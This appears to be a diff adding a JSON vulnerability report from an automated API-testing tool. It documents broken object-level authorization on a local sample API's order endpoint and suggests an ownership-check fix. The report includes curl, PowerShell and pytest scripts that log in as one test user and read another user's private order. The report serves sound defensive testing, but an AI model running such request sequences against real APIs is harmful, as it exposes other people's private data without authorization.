@@ -1,0 +1,62 @@
+{
+  "report_id": "report-7254adc1",
+  "finding_id": "finding-46eb0dab",
+  "bug_type": "BOLA_VIOLATION",
+  "severity": "CRITICAL",
+  "endpoint": "/orders/{order_id}",
+  "method": "GET",
+  "title": "Broken Object Level Authorization (BOLA) on GET /orders/{order_id}",
+  "summary_explanation": "Broken Object Level Authorization (BOLA / OWASP API1:2023) detected: User 'user-bob' successfully accessed private resource 'ord-4' belonging to user 'user-alice'. The API failed to enforce object ownership.",
+  "expected_behavior": "Access denied (HTTP 403 Forbidden or HTTP 404 Not Found). User 'user-bob' does not own resource 'ord-4' (owned by 'user-alice').",
+  "actual_behavior": "HTTP 200 returned with private resource data.",
+  "evidence": {
+    "vulnerability_standard": "OWASP API Security Top 10 (2023) - API1: BOLA",
+    "resource_id": "ord-4",
+    "resource_owner_id": "user-alice",
+    "accessor_user_id": "user-bob",
+    "returned_owner_id": "user-alice",
+    "is_unauthorized_access": true
+  },
+  "verification_status": "CONFIRMED_REPRODUCIBLE",
+  "is_reproducible": true,
+  "diagnosis": {
+    "hypothesis": "The endpoint GET /orders/{order_id} enforces user authentication (requiring a valid Bearer token) but omits object-level authorization. The backend handler retrieves the requested object by ID and returns it directly without verifying that the authenticated user owns or is authorized to view the resource.",
+    "supporting_evidence": [
+      "User 'user-bob' successfully accessed private resource 'ord-4' owned by 'user-alice'.",
+      "The server returned HTTP 200 OK with the full private order payload instead of HTTP 403 Forbidden.",
+      "Control test confirmed that the resource owner can access the object normally.",
+      "Reproducibility verification confirmed consistent recurrence across clean resets."
+    ],
+    "additional_checks": [
+      "Inspect the route handler in 'sample_api/main.py' to confirm if an ownership comparison exists.",
+      "Test unauthenticated access (no Bearer header) to ensure authentication middleware is functioning.",
+      "Test requesting a non-existent ID to ensure 404 handling occurs before authorization logic."
+    ],
+    "suggested_fix": "# In sample_api/main.py: get_order_by_id\nif order[\"user_id\"] != current_user[\"user_id\"]:\n    raise HTTPException(\n        status_code=status.HTTP_403_FORBIDDEN,\n        detail=\"Forbidden: You do not have permission to access this order.\",\n    )",
+    "remediation_explanation": "Before returning private order details, compare the owner ID ('order[\"user_id\"]') against the currently authenticated caller ('current_user[\"user_id\"]'). If they do not match, reject the request with HTTP 403 Forbidden (or HTTP 404 to prevent ID enumeration).",
+    "uncertainties": [
+      "This diagnosis is formulated from black-box HTTP request/response observations and is classified as an unverified hypothesis until verified against backend source code."
+    ],
+    "is_ai_generated": false,
+    "diagnosis_source": "rule_based_fallback (no LLM API key configured)"
+  },
+  "original_requests_count": 10,
+  "minimized_requests_count": 4,
+  "reduction_percentage": 60.0,
+  "pruned_requests": [
+    "Pre-Check System Health 1",
+    "Intermittent Health Ping 2",
+    "Intermittent Health Ping 3",
+    "Intermittent Health Ping 4",
+    "Post-Check System Health 5",
+    "Post-Check System Health 6"
+  ],
+  "pruned_payload_fields": [
+    "Create Alice Order.notes",
+    "Create Alice Order.gift_wrap"
+  ],
+  "curl_reproduction": "#!/usr/bin/env bash\n# Target: GET /orders/{order_id}\n\n# Step 1: Reset test database\ncurl -s -X POST \"http://127.0.0.1:8000/admin/reset\"\n\n# Step 2: Login as Alice to obtain token\nALICE_TOKEN=$(curl -s -X POST \"http://127.0.0.1:8000/auth/login\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"alice\",\"password\":\"alice123\"}' | grep -o '\"access_token\":\"[^\"]*' | cut -d'\"' -f4)\n\n# Step 3: Create private order as Alice\nORDER_ID=$(curl -s -X POST \"http://127.0.0.1:8000/orders\" \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer $ALICE_TOKEN\" \\\n  -d '{\"item_name\":\"Autonomous Drone\",\"quantity\":1,\"total_price\":299.99}' | grep -o '\"id\":\"[^\"]*' | cut -d'\"' -f4)\n\n# Step 4: Login as Bob to obtain Bob's token\nBOB_TOKEN=$(curl -s -X POST \"http://127.0.0.1:8000/auth/login\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"bob\",\"password\":\"bob123\"}' | grep -o '\"access_token\":\"[^\"]*' | cut -d'\"' -f4)\n\n# Step 5: Bob accesses Alice's order without authorization (BOLA exploit)\ncurl -i -X GET \"http://127.0.0.1:8000/orders/$ORDER_ID\" \\\n  -H \"Authorization: Bearer $BOB_TOKEN\"",
+  "powershell_reproduction": "# Windows PowerShell Reproduction Script\n# Target: GET /orders/{order_id}\n\n# Step 1: Reset test database\nInvoke-RestMethod -Method Post -Uri \"http://127.0.0.1:8000/admin/reset\"\n\n# Step 2: Login as Alice to obtain her token\n$alice = Invoke-RestMethod -Method Post -Uri \"http://127.0.0.1:8000/auth/login\" -ContentType \"application/json\" -Body '{\"username\":\"alice\",\"password\":\"alice123\"}'\n\n# Step 3: Create an order as Alice\n$headersAlice = @{ Authorization = \"Bearer \" + $alice.access_token }\n$order = Invoke-RestMethod -Method Post -Uri \"http://127.0.0.1:8000/orders\" -Headers $headersAlice -ContentType \"application/json\" -Body '{\"item_name\":\"Autonomous Drone\",\"quantity\":1,\"total_price\":299.99}'\n\n# Step 4: Login as Bob to obtain Bob's token\n$bob = Invoke-RestMethod -Method Post -Uri \"http://127.0.0.1:8000/auth/login\" -ContentType \"application/json\" -Body '{\"username\":\"bob\",\"password\":\"bob123\"}'\n\n# Step 5: Bob retrieves Alice's private order (BOLA exploit)\n$headersBob = @{ Authorization = \"Bearer \" + $bob.access_token }\nInvoke-RestMethod -Method Get -Uri (\"http://127.0.0.1:8000/orders/\" + $order.id) -Headers $headersBob",
+  "pytest_reproduction": "\"\"\"Standalone Automated Reproduction Test for API Bug Finding.\n\nGenerated by Autonomous AI Testing Agent (Step 7).\nTarget Endpoint: GET /orders/{order_id}\nClassification:  BOLA_VIOLATION (CRITICAL)\n\nPrerequisites:\n- Target API must be running at http://127.0.0.1:8000\n- Execute with: pytest reports/test_reproduce_bola.py -v\n\"\"\"\n\nimport httpx\nimport pytest\n\nBASE_URL = \"http://127.0.0.1:8000\"\n\n\ndef test_reproduce_bola_vulnerability():\n    \"\"\"Demonstrates that Bob can read Alice's private order without authorization.\"\"\"\n    with httpx.Client(base_url=BASE_URL, timeout=10.0) as client:\n        # 1. Reset state to ensure clean, isolated execution\n        reset_res = client.post(\"/admin/reset\")\n        assert reset_res.status_code == 200, \"Failed to reset test database\"\n\n        # 2. Login as Alice\n        alice_login = client.post(\"/auth/login\", json={\"username\": \"alice\", \"password\": \"alice123\"})\n        assert alice_login.status_code == 200, f\"Alice login failed: {alice_login.text}\"\n        alice_token = alice_login.json()[\"access_token\"]\n        alice_id = alice_login.json()[\"user_id\"]\n\n        # 3. Create private order as Alice\n        order_res = client.post(\n            \"/orders\",\n            headers={\"Authorization\": f\"Bearer {alice_token}\"},\n            json={\"item_name\": \"Autonomous Drone\", \"quantity\": 1, \"total_price\": 299.99},\n        )\n        assert order_res.status_code == 201, f\"Order creation failed: {order_res.text}\"\n        order_id = order_res.json()[\"id\"]\n\n        # 4. Login as Bob\n        bob_login = client.post(\"/auth/login\", json={\"username\": \"bob\", \"password\": \"bob123\"})\n        assert bob_login.status_code == 200, f\"Bob login failed: {bob_login.text}\"\n        bob_token = bob_login.json()[\"access_token\"]\n        bob_id = bob_login.json()[\"user_id\"]\n\n        # 5. Bob attempts to access Alice's private order\n        bob_access = client.get(\n            f\"/orders/{order_id}\",\n            headers={\"Authorization\": f\"Bearer {bob_token}\"},\n        )\n\n        # ----------------------------------------------------------------------\n        # REPRODUCTION ASSERTION:\n        # The vulnerable endpoint returns HTTP 200 and Alice's order to Bob!\n        # In a secure implementation, this request would return HTTP 403 Forbidden.\n        # ----------------------------------------------------------------------\n        assert bob_access.status_code == 200, (\n            f\"Expected BOLA exploit (HTTP 200), received {bob_access.status_code}\"\n        )\n        data = bob_access.json()\n        assert data[\"user_id\"] == alice_id, \"Returned order owner does not match Alice\"\n        assert bob_id != alice_id, \"Accessor and owner must be distinct accounts\"\n",
+  "created_at": "2026-10-13T06:55:15.844495+00:00"
+}
